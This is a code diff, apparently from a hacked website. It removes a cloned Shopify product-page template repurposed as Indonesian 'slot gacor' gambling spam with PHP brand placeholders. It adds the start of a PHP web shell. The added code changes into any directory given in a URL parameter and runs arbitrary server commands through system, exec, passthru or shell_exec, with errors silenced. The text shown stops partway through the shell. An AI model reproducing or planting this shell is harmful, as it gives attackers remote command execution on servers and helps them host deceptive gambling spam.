-            twoMonthsFromNow.setMonth(twoMonthsFromNow.getMonth() + 2);
-            document.cookie = 'loggedConversion=' + token + '; expires=' + twoMonthsFromNow;
-          }
-        }
-        var trekkie = window.ShopifyAnalytics.lib = window.trekkie = window.trekkie || [];
-        if (trekkie.integrations) {
-          return;
-        }
-        trekkie.methods = [
-          'identify',
-          'page',
-          'ready',
-          'track',
-          'trackForm',
-          'trackLink'
-        ];
-        trekkie.factory = function (method) {
-          return function () {
-            var args = Array.prototype.slice.call(arguments);
-            args.unshift(method);
-            trekkie.push(args);
-            return trekkie;
-          };
-        };
-        for (var i = 0; i < trekkie.methods.length; i++) {
-          var key = trekkie.methods[i];
-          trekkie[key] = trekkie.factory(key);
-        }
-        trekkie.load = function (config) {
-          trekkie.config = config || {};
-          trekkie.config.initialDocumentCookie = document.cookie;
-          var first = document.getElementsByTagName('script')[0];
-          var script = document.createElement('script');
-          script.type = 'text/javascript';
-          script.onerror = function (e) {
-            var scriptFallback = document.createElement('script');
-            scriptFallback.type = 'text/javascript';
-            scriptFallback.onerror = function (error) {
-              var Monorail = {
-                produce: function produce(monorailDomain, schemaId, payload) {
-                  var currentMs = new Date().getTime();
-                  var event = {
-                    schema_id: schemaId,
-                    payload: payload,
-                    metadata: {
-                      event_created_at_ms: currentMs,
-                      event_sent_at_ms: currentMs
-                    }
-                  };
-                  return Monorail.sendRequest("https://" + monorailDomain + "/v1/produce", JSON.stringify(event));
-                },
-                sendRequest: function sendRequest(endpointUrl, payload) {
-                  // Try the sendBeacon API
-                  if (window && window.navigator && typeof window.navigator.sendBeacon === 'function' && typeof window.Blob === 'function' && !Monorail.isIos12()) {
-                    var blobData = new window.Blob([payload], {
-                      type: 'text/plain'
-                    });
-                    if (window.navigator.sendBeacon(endpointUrl, blobData)) {
-                      return true;
-                    } // sendBeacon was not successful
-                  } // XHR beacon
-                  var xhr = new XMLHttpRequest();
-                  try {
-                    xhr.open('POST', endpointUrl);
-                    xhr.setRequestHeader('Content-Type', 'text/plain');
-                    xhr.send(payload);
-                  } catch (e) {
-                    console.log(e);
-                  }
-                  return false;
-                },
-                isIos12: function isIos12() {
-                  return window.navigator.userAgent.lastIndexOf('iPhone; CPU iPhone OS 12_') !== -1 || window.navigator.userAgent.lastIndexOf('iPad; CPU OS 12_') !== -1;
-                }
-              };
-              Monorail.produce('monorail-edge.shopifysvc.com',
-                'trekkie_storefront_load_errors/1.1', {
-                  shop_id: 57966493774,
-                  theme_id: 125872013390,
-                  app_name: "storefront",
-                  context_url: window.location.href,
-                  source_url: "cdn/s/trekkie.storefront.7a4225caf9379fe42103e492053220a7195df1ae.min.js"
-                });
-            };
-            scriptFallback.async = true;
-            scriptFallback.src = 'cdn/s/trekkie.storefront.7a4225caf9379fe42103e492053220a7195df1ae.min.html';
-            first.parentNode.insertBefore(scriptFallback, first);
-          };
-          script.async = true;
-          script.src = 'cdn/s/trekkie.storefront.7a4225caf9379fe42103e492053220a7195df1ae.min.html';
-          first.parentNode.insertBefore(script, first);
-        };
-        trekkie.load({
-          "Trekkie": {
-            "appName": "storefront",
-            "development": false,
-            "defaultAttributes": {
-              "shopId": 57966493774,
-              "isMerchantRequest": null,
-              "themeId": 125872013390,
-              "themeCityHash": "1037719678984080351",
-              "contentLanguage": "en",
-              "currency": "IDR"
-            },
-            "isServerSideCookieWritingEnabled": true,
-            "monorailRegion": "shop_domain"
-          },
-          "Session Attribution": {},
-          "S2S": {
-            "facebookCapiEnabled": false,
-            "source": "trekkie-storefront-renderer"
-          }
-        });
-        var loaded = false;
-        trekkie.ready(function () {
-          if (loaded) return;
-          loaded = true;
-          window.ShopifyAnalytics.lib = window.trekkie;
-          var originalDocumentWrite = document.write;
-          document.write = customDocumentWrite;
-          try {
-            window.ShopifyAnalytics.merchantGoogleAnalytics.call(this);
-          } catch (error) {};
-          document.write = originalDocumentWrite;
-          window.ShopifyAnalytics.lib.page(null, {
-            "pageType": "product",
-            "resourceType": "product",
-            "resourceId": 6962851840078
-          });
-          var match = window.location.pathname.match(/checkouts\/(.+)\/(thank_you|post_purchase)/)
-          var token = match ? match[1] : undefined;
-          if (!hasLoggedConversion(token)) {
-            setCookieIfConversion(token);
-            window.ShopifyAnalytics.lib.track("Viewed Product", {
-              "currency": "IDR",
-              "variantId": 40476417982542,
-              "productId": 6962851840078,
-              "productGid": "gid:\/\/shopify\/Product\/6962851840078",
-              "name": "<?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024",
-              "price": "25.00",
-              "sku": "",
-              "brand": "<?php echo $BRANDS ?>",
-              "variant": null,
-              "category": "",
-              "nonInteraction": true
-            });
-            window.ShopifyAnalytics.lib.track("monorail:\/\/trekkie_storefront_viewed_product\/1.1", {
-              "currency": "IDR",
-              "variantId": 40476417982542,
-              "productId": 6962851840078,
-              "productGid": "gid:\/\/shopify\/Product\/6962851840078",
-              "name": "<?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024",
-              "price": "25.00",
-              "sku": "",
-              "brand": "<?php echo $BRANDS ?>",
-              "variant": null,
-              "category": "",
-              "nonInteraction": true,
-              "referer": "https:\/\/seafoodsallys.com"
-            });
-          }
-        });
-        var eventsListenerScript = document.createElement('script');
-        eventsListenerScript.async = true;
-        eventsListenerScript.src = "cdn/shopifycloud/shopify/assets/shop_events_listener-a7c63dba65ccddc484f77541dc8ca437e60e1e9e297fe1c3faebf6523a0ede9b.html";
-        document.getElementsByTagName('head')[0].appendChild(eventsListenerScript);
-      })();
-    </script>
-    <script class="boomerang">
-      (function () {
-        if (window.BOOMR && (window.BOOMR.version || window.BOOMR.snippetExecuted)) {
-          return;
-        }
-        window.BOOMR = window.BOOMR || {};
-        window.BOOMR.snippetStart = new Date().getTime();
-        window.BOOMR.snippetExecuted = true;
-        window.BOOMR.snippetVersion = 12;
-        window.BOOMR.application = "storefront-renderer";
-        window.BOOMR.themeName = "Refresh";
-        window.BOOMR.themeVersion = "12.0.0";
-        window.BOOMR.shopId = 57966493774;
-        window.BOOMR.themeId = 125872013390;
-        window.BOOMR.renderRegion = "gcp-asia-southeast1";
-        window.BOOMR.url =
-          "cdn/shopifycloud/boomerang/shopify-boomerang-1.0.0.min.html";
-        var where = document.currentScript || document.getElementsByTagName("script")[0];
-        var parentNode = where.parentNode;
-        var promoted = false;
-        var LOADER_TIMEOUT = 3000;
+input[type=submit] {
+	padding: 2px;}
 
-        function promote() {
-          if (promoted) {
-            return;
-          }
-          var script = document.createElement("script");
-          script.id = "boomr-scr-as";
-          script.src = window.BOOMR.url;
-          script.async = true;
-          parentNode.appendChild(script);
-          promoted = true;
-        }
+input[type=submit]:hover {
+	cursor: pointer;
+}
 
-        function iframeLoader(wasFallback) {
-          promoted = true;
-          var dom, bootstrap, iframe, iframeStyle;
-          var doc = document;
-          var win = window;
-          window.BOOMR.snippetMethod = wasFallback ? "if" : "i";
-          bootstrap = function (parent, scriptId) {
-            var script = doc.createElement("script");
-            script.id = scriptId || "boomr-if-as";
-            script.src = window.BOOMR.url;
-            BOOMR_lstart = new Date().getTime();
-            parent = parent || doc.body;
-            parent.appendChild(script);
-          };
-          if (!window.addEventListener && window.attachEvent && navigator.userAgent.match(/MSIE [67]./)) {
-            window.BOOMR.snippetMethod = "s";
-            bootstrap(parentNode, "boomr-async");
-            return;
-          }
-          iframe = document.createElement("IFRAME");
-          iframe.src = "about:blank";
-          iframe.title = "";
-          iframe.role = "presentation";
-          iframe.loading = "eager";
-          iframeStyle = (iframe.frameElement || iframe).style;
-          iframeStyle.width = 0;
-          iframeStyle.height = 0;
-          iframeStyle.border = 0;
-          iframeStyle.display = "none";
-          parentNode.appendChild(iframe);
-          try {
-            win = iframe.contentWindow;
-            doc = win.document.open();
-          } catch (e) {
-            dom = document.domain;
-            iframe.src = "javascript:var d=document.open();d.domain='" + dom + "';void(0);";
-            win = iframe.contentWindow;
-            doc = win.document.open();
-          }
-          if (dom) {
-            doc._boomrl = function () {
-              this.domain = dom;
-              bootstrap();
-            };
-            doc.write("<body onload='document._boomrl();'>");
-          } else {
-            win._boomrl = function () {
-              bootstrap();
-            };
-            if (win.addEventListener) {
-              win.addEventListener("load", win._boomrl, false);
-            } else if (win.attachEvent) {
-              win.attachEvent("onload", win._boomrl);
-            }
-          }
-          doc.close();
-        }
-        var link = document.createElement("link");
-        if (link.relList &&
-          typeof link.relList.supports === "function" &&
-          link.relList.supports("preload") &&
-          ("as" in link)) {
-          window.BOOMR.snippetMethod = "p";
-          link.href = window.BOOMR.url;
-          link.rel = "preload";
-          link.as = "script";
-          link.addEventListener("load", promote);
-          link.addEventListener("error", function () {
-            iframeLoader(true);
-          });
-          setTimeout(function () {
-            if (!promoted) {
-              iframeLoader(true);
-            }
-          }, LOADER_TIMEOUT);
-          BOOMR_lstart = new Date().getTime();
-          parentNode.appendChild(link);
-        } else {
-          iframeLoader(false);
-        }
+input:focus, textarea:focus {
+  outline: 0;
+  border-color: #ffffff;
+}
 
-        function boomerangSaveLoadTime(e) {
-          window.BOOMR_onload = (e && e.timeStamp) || new Date().getTime();
-        }
-        if (window.addEventListener) {
-          window.addEventListener("load", boomerangSaveLoadTime, false);
-        } else if (window.attachEvent) {
-          window.attachEvent("onload", boomerangSaveLoadTime);
-        }
-        if (document.addEventListener) {
-          document.addEventListener("onBoomerangLoaded", function (e) {
-            e.detail.BOOMR.init({
-              ResourceTiming: {
-                enabled: true,
-                trackedResourceTypes: ["script", "img", "css"]
-              },
-            });
-            e.detail.BOOMR.t_end = new Date().getTime();
-          });
-        } else if (document.attachEvent) {
-          document.attachEvent("onpropertychange", function (e) {
-            if (!e) e = event;
-            if (e.propertyName === "onBoomerangLoaded") {
-              e.detail.BOOMR.init({
-                ResourceTiming: {
-                  enabled: true,
-                  trackedResourceTypes: ["script", "img", "css"]
-                },
-              });
-              e.detail.BOOMR.t_end = new Date().getTime();
-            }
-          });
-        }
-      })();
-    </script>
-    <script>
-      document.addEventListener('DOMContentLoaded', function () {
-        function isIE() {
-          const ua = window.navigator.userAgent;
-          const msie = ua.indexOf('MSIE ');
-          const trident = ua.indexOf('Trident/<?php echo $urlPath ?>');
-          return msie > 0 || trident > 0;
-        }
-        if (!isIE()) return;
-        const cartSubmitInput = document.createElement('input');
-        cartSubmitInput.setAttribute('name', 'checkout');
-        cartSubmitInput.setAttribute('type', 'hidden');
-        document.querySelector('#cart').appendChild(cartSubmitInput);
-        document.querySelector('#checkout').addEventListener('click', function (event) {
-          document.querySelector('#cart').submit();
-        });
-      });
-    </script>
-    <style>
-      .drawer {
-        visibility: hidden;
-      }
-    </style>
-    <style>
-      header-drawer {
-        justify-self: start;
-        margin-left: -1.2rem;
-      }
-      @media screen and (min-width: 990px) {
-        header-drawer {
-          display: none;
-        }
-      }
-      .menu-drawer-container {
-        display: flex;
-      }
-      .list-menu {
-        list-style: none;
-        padding: 0;
-        margin: 0;
-      }
-      .list-menu--inline {
-        display: inline-flex;
-        flex-wrap: wrap;
-      }
-      summary.list-menu__item {
-        padding-right: 2.7rem;
-      }
-      .list-menu__item {
-        display: flex;
-        align-items: center;
-        line-height: calc(1 + 0.3 / var(--font-body-scale));
-      }
-      .list-menu__item--link {
-        text-decoration: none;
-        padding-bottom: 1rem;
-        padding-top: 1rem;
-        line-height: calc(1 + 0.8 / var(--font-body-scale));
-      }
-      @media screen and (min-width: 750px) {
-        .list-menu__item--link {
-          padding-bottom: 0.5rem;
-          padding-top: 0.5rem;
-        }
-      }
-    </style>
-    <style data-shopify>
-      .header {
-        padding: 10px 3rem 10px 3rem;
-      }
-      .section-header {
-        position: sticky; /* This is for fixing a Safari z-index issue. PR #2147 */
-        margin-bottom: 0px;
-      }
-      @media screen and (min-width: 750px) {
-        .section-header {
-          margin-bottom: 0px;
-        }
-      }
-      @media screen and (min-width: 990px) {
-        .header {
-          padding-top: 20px;
-          padding-bottom: 20px;
-        }
-      }
-    </style>
-    <style data-shopify>
-      .section-template--15207369113678__main-padding {
-        padding-top: 45px;
-        padding-bottom: 45px;
-      }
-      @media screen and (min-width: 750px) {
-        .section-template--15207369113678__main-padding {
-          padding-top: 60px;
-          padding-bottom: 60px;
-        }
-      }
-    </style>
-    <style data-shopify>
-      .section-template--15207369113678__related-products-padding {
-        padding-top: 0px;
-        padding-bottom: 45px;
-      }
+textarea {
+	border: 1px solid #ffffff;
+	width: 100%;
+	height: 400px;
+	padding-left: 5px;
+	margin: 10px auto;
+	resize: none;
+	background: transparent;
+	color: #ffffff;
+	font-family: 'Ubuntu';
+	font-size: 13px;
+}
+iframe {
+	width: 100%;
+	min-height: 500px;
+}
+</style>
+</head>
+<body>
+<?php
+function path() {
+	if(isset($_GET['dir'])) {
+		$dir = str_replace("\\", "/", $_GET['dir']);
+		@chdir($dir);
+	} else {
+		$dir = str_replace("\\", "/", getcwd());
+	}
+	return $dir;
+}
 
-      @media screen and (min-width: 750px) {
-        .section-template--15207369113678__related-products-padding {
-          padding-top: 0px;
-          padding-bottom: 60px;
-        }
-      }
-    </style>
-    <style data-shopify>
-      .section-sections--15207369769038__newsletter-padding {
-        padding-top: 21px;
-        padding-bottom: 0px;
-      }
+function color($bold = 1, $colorid = null, $string = null) {
+		$color = array(
+			"</font>",  			# 0 off
+			"<font color='red'>",	# 1 red 
+			"<font color='lime'>",	# 2 lime
+			"<font color='white'>",	# 3 white
+			"<font color='gold'>",	# 4 gold
+		);
 
-      @media screen and (min-width: 750px) {
-        .section-sections--15207369769038__newsletter-padding {
-          padding-top: 28px;
-          padding-bottom: 0px;
-        }
-      }
-    </style>
-    <style data-shopify>
-      .footer {
-        margin-top: 0px;
-      }
-      .section-sections--15207369769038__footer-padding {
-        padding-top: 33px;
-        padding-bottom: 45px;
-      }
-      @media screen and (min-width: 750px) {
-        .footer {
-          margin-top: 0px;
-        }
-        .section-sections--15207369769038__footer-padding {
-          padding-top: 44px;
-          padding-bottom: 60px;
-        }
-      }
-    </style>
-    <style>
-      .fixed-footer {
-        position: fixed;
-        background: #141413;
-        color: #adc4c4;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        z-index: 99;
-        display: flex;
-        justify-content: space-around;
-        align-items: center;
-        padding: 10px;
-        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-      }
+	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
+}
 
-      .fixed-footer a {
-        text-decoration: none;
-        color: #fff;
-        font-weight: bolder;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        transition: all 0.3s ease;
-        padding: 5px;
-        border-radius: 10px;
-        box-shadow: 0 4px 10px rgb(2, 2, 2);
-        /* Box-shadow dengan warna tembal */
-        background-color: #b50b07;
-        flex-grow: 1;
-        margin: 0 5px;
-        max-width: calc((100% - 20px) / 5);
-        min-width: 0;
-        text-align: center;
-        white-space: nowrap;
-        overflow: hidden;
-        text-overflow: ellipsis;
-        background-size: cover;
-        background-position: center;
-      }
+function OS() {
+	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
+}
 
-      .fixed-footer img {
-        width: 30px;
-        margin-bottom: 5px;
-      }
+function exe($cmd) {
+	if(function_exists('system')) { 		
+		@ob_start(); 		
+		@system($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('exec')) { 		
+		@exec($cmd,$results); 		
+		$buff = ""; 		
+		foreach($results as $result) { 			
+			$buff .= $result; 		
+		} return $buff; 	
+	} elseif(function_exists('passthru')) { 		
+		@ob_start(); 		
+		@passthru($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('shell_exec')) { 		
+		$buff = @shell_exec($cmd); 		
+		return $buff; 	
+	} 
+}
 
-      .fixed-footer a:hover {
-        font-weight: bolder;
-        background-color: #e2c523;
-        transform: translateY(2px) scale(0.95);
-        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.3);
-      }
-      .login, .register {
-        color: #fff;
-        padding: 13px 10px;
-      }
-      .login, .login-button {
-        border: 1px solid #ff0000;
-        background: linear-gradient(to bottom, #d60000 0, #660000 100%);
-      }
-      .register, .register-button {
-        background: linear-gradient(to bottom, #0600ff 0, #000899 100%);
-        border: 1px solid #0024ff;
-      }
-    </style>
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/section-main-productc25c.css?v=141059467971401676601702987226" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-accordion690f.css?v=180964204318874863811702987223" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-price4cb6.css?v=70172745017360139101702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-slidera45e.css?v=142503135496229589681702987225" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-rating847b.css?v=157771854592137137841702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-deferred-media8b2a.css?v=14096082462203297471702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-slideshowbd87.css?v=107725913939919748051702987225" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-slidera45e.css?v=142503135496229589681702987225" rel="stylesheet" type="text/css" media="all" />
-    <link rel="stylesheet" href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-list-menu19ee.css?v=151968516119678728991702987224" media="print" onload="this.media='all'">
-    <link rel="stylesheet" href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-search6033.css?v=165164710990765432851702987225" media="print" onload="this.media='all'">
-    <link rel="stylesheet" href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-menu-drawera5d2.css?v=31331429079022630271702987224" media="print" onload="this.media='all'">
-    <link rel="stylesheet" href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-cart-notificationdd0f.css?v=54116361853792938221702987224" media="print" onload="this.media='all'">
-    <link rel="stylesheet" href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-cart-items8cd1.css?v=145340746371385151771702987224" media="print" onload="this.media='all'">
-    <link rel="stylesheet" href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-price4cb6.css?v=70172745017360139101702987224" media="print" onload="this.media='all'">
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-cart-drawerdd90.html?v=11376100058507027511702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-cart77f9.html?v=181291337967238571831702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-totalsacdb.html?v=15906652033866631521702987225" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-price4cb6.css?v=70172745017360139101702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-discounts31ff.html?v=152760482443307489271702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-loading-spinner5c3d.css?v=116724955567955766481702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-loading-spinner5c3d.css?v=116724955567955766481702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/section-footer7679.css?v=125160298726032154631702987226" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-newsletterf5fe.css?v=4727253280200485261702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-list-menu19ee.css?v=151968516119678728991702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-list-payment3b79.css?v=69253961410771838501702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-list-social31da.css?v=35792976012981934991702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-newsletterf5fe.css?v=4727253280200485261702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/newsletter-section172d.html?v=62410470717655853621702987225" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-cardc5f6.css?v=47260860684073105921702987223" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-price4cb6.css?v=70172745017360139101702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/section-related-productsc957.css?v=80324771040738084201702987226" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-loading-spinner5c3d.css?v=116724955567955766481702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-loading-spinner5c3d.css?v=116724955567955766481702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-loading-spinner5c3d.css?v=116724955567955766481702987224" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-pickup-availability9759.css?v=34645222959864780961702987224" rel="stylesheet" type="text/css" media="all" />
-    <noscript>
-      <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-list-menu19ee.css?v=151968516119678728991702987224" rel="stylesheet" type="text/css" media="all" />
-    </noscript>
-    <noscript>
-      <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-search6033.css?v=165164710990765432851702987225" rel="stylesheet" type="text/css" media="all" />
-    </noscript>
-    <noscript>
-      <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-menu-drawera5d2.css?v=31331429079022630271702987224" rel="stylesheet" type="text/css" media="all" />
-    </noscript>
-    <noscript>
-      <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-cart-notificationdd0f.css?v=54116361853792938221702987224" rel="stylesheet" type="text/css" media="all" />
-    </noscript>
-    <noscript>
-      <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-cart-items8cd1.css?v=145340746371385151771702987224" rel="stylesheet" type="text/css" media="all" />
-    </noscript>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/details-disclosure79dc.js?v=13653116266235556501702987225" defer="defer"></script>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/details-modal581e.js?v=25581673532751508451702987225" defer="defer"></script>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/cart-notification5f08.js?v=133508293167896966491702987223" defer="defer"></script>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/search-form48d5.js?v=133129549252120666541702987226" defer="defer"></script>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/cart-drawerfbfc.html?v=105077087914686398511702987223" defer="defer"></script>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/product-infoe471.js?v=81873523020508815201702987225" defer="defer"></script>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/product-formdd08.js?v=133081758708377679181702987225" defer="defer"></script>
-    <script type="application/ld+json">
-      {
-        "@context": "http://schema.org",
-        "@type": "Organization",
-        "name": "<?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024",
-        
-        "sameAs": [
-          "",
-          "",
-          "",
-          "",
-          "",
-          "",
-          "",
-          "",
-          ""
-        ],
-        "url": "<?php echo $urlPath ?>"
-      }
-    </script>
-    <script type="application/ld+json">
-      {
-        "@context": "http://schema.org/",
-        "@type": "Product",
-        "name": "<?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024",
-        "url": "<?php echo $urlPath ?>",
-        "image": ["https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&width=600"],
-        "description": "<?php echo $BRANDS ?> ialah situs slot gacor yang sudah berdiri sejak 2015 hingga saat ini dan telah resmi menjadi platform untuk meraih jackpot dengan mudah di tahun 2024.",
-        "brand": {"@type": "Brand","name": "<?php echo $BRANDS ?>"},
-        "offers": [
-          {
-            "@type" : "Offer","availability" : "http://schema.org/OutOfStock",
-            "price" : 25000.0,
-            "priceCurrency" : "IDR",
-            "url" : "<?php echo $urlPath ?>"
-          }
-        ]
-      }
-    </script>
-  </head>
-  <body class="gradient">
-    <div id="shopify-section-sections--15207369867342__announcement-bar" class="shopify-section shopify-section-group-header-group announcement-bar-section">
-      <div class="utility-bar color-accent-1 gradient utility-bar--bottom-border">
-        <div class="page-width utility-bar__grid">
-          <div class="announcement-bar" role="region" aria-label="Announcement">
-            <p class="announcement-bar__message h5">
-              <span>SITUS SLOT GACOR HARI INI ONLINE 24 JAM TERPERCAYA</span>
-            </p>
-          </div>
-          <div class="localization-wrapper"></div>
-        </div>
-      </div>
-    </div>
-    <div id="shopify-section-sections--15207369867342__header" class="shopify-section shopify-section-group-header-group section-header">
-      <svg xmlns="http://www.w3.org/2000/svg" class="hidden">
-        <symbol id="icon-search" viewbox="0 0 18 19" fill="none">
-          <path fill-rule="evenodd" clip-rule="evenodd" d="M11.03 11.68A5.784 5.784 0 112.85 3.5a5.784 5.784 0 018.18 8.18zm.26 1.12a6.78 6.78 0 11.72-.7l5.4 5.4a.5.5 0 11-.71.7l-5.41-5.4z" fill="currentColor"/>
-        </symbol>
-        <symbol id="icon-reset" class="icon icon-close"  fill="none" viewBox="0 0 18 18" stroke="currentColor">
-          <circle r="8.5" cy="9" cx="9" stroke-opacity="0.2"/>
-          <path d="M6.82972 6.82915L1.17193 1.17097" stroke-linecap="round" stroke-linejoin="round" transform="translate(5 5)"/>
-          <path d="M1.22896 6.88502L6.77288 1.11523" stroke-linecap="round" stroke-linejoin="round" transform="translate(5 5)"/>
-        </symbol>
-        <symbol id="icon-close" class="icon icon-close" fill="none" viewBox="0 0 18 17">
-          <path d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z" fill="currentColor" />
-        </symbol>
-      </svg>
-      <sticky-header data-sticky-type="on-scroll-up" class="header-wrapper color-inverse gradient">
-        <header class="header header--top-center header--mobile-center page-width header--has-menu">
-          <header-drawer data-breakpoint="tablet">
-            <details id="Details-menu-drawer-container" class="menu-drawer-container">
-              <summary class="header__icon header__icon--menu header__icon--summary link focus-inset" aria-label="Menu">
-                <span>
-                  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="icon icon-hamburger" fill="none" viewBox="0 0 18 16">
-                    <path d="M1 .5a.5.5 0 100 1h15.71a.5.5 0 000-1H1zM.5 8a.5.5 0 01.5-.5h15.71a.5.5 0 010 1H1A.5.5 0 01.5 8zm0 7a.5.5 0 01.5-.5h15.71a.5.5 0 010 1H1a.5.5 0 01-.5-.5z" fill="currentColor" />
-                  </svg>
-                  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="icon icon-close" fill="none" viewBox="0 0 18 17">
-                    <path d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z" fill="currentColor" />
-                  </svg>
-                </span>
-              </summary>
-              <div id="menu-drawer" class="gradient menu-drawer motion-reduce color-inverse">
-                <div class="menu-drawer__inner-container">
-                  <div class="menu-drawer__navigation-container">
-                    <div class="menu-drawer__utility-links">
-                      <div class="menu-drawer__localization header-localization"></div>
-                      <ul class="list list-social list-unstyled" role="list"></ul>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </details>
-          </header-drawer>
-          <details-modal class="header__search">
-            <details>
-              <summary class="header__icon header__icon--search header__icon--summary link focus-inset modal__toggle" aria-haspopup="dialog" aria-label="Search">
-                <span>
-                  <svg class="modal__toggle-open icon icon-search" aria-hidden="true" focusable="false">
-                    <use href="<?php echo $urlPath ?>"></use>
-                  </svg>
-                  <svg class="modal__toggle-close icon icon-close" aria-hidden="true" focusable="false">
-                    <use href="<?php echo $urlPath ?>"></use>
-                  </svg>
-                </span>
-              </summary>
-              <div class="search-modal modal__content gradient" role="dialog" aria-modal="true" aria-label="Search">
-                <div class="modal-overlay"></div>
-                <div class="search-modal__content search-modal__content-bottom" tabindex="-1">
-                  <predictive-search class="search-modal__form" data-loading-text="Loading...">
-                    <form action="<?php echo $urlPath ?>search" method="get" role="search" class="search search-modal__form">
-                      <div class="field">
-                        <input class="search__input field__input" id="Search-In-Modal-1" type="search" name="q" value="" placeholder="Search"role="combobox" aria-expanded="false" aria-owns="predictive-search-results" aria-controls="predictive-search-results" aria-haspopup="listbox" aria-autocomplete="list" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false">
-                        <label class="field__label" for="Search-In-Modal-1">Search</label>
-                        <input type="hidden" name="options[prefix]" value="last">
-                        <button type="reset" class="reset__button field__button hidden" aria-label="Clear search term">
-                          <svg class="icon icon-close" aria-hidden="true" focusable="false">
